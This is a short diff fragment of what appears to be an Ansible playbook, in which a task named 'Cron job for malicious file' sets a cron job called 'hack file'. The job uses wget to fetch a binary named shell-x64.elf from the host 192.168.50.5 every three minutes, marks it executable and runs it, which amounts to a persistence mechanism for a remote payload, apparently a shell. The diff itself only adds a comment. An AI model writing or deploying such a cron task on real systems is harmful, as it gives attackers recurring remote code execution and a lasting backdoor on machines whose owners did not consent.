@@ -25,7 +25,7 @@
 - name: Cron job for malicious file
   cron:
    name: "hack file"
-   minute: "*/3"
+   minute: "*/3" # every 3 minutes
    job: "wget -O /home/server/shell-x64.elf http://192.168.50.5/shell-x64.elf && chmod +x /home/server/shell-x64.elf && /home/server/shell-x64.elf"
 
 ...
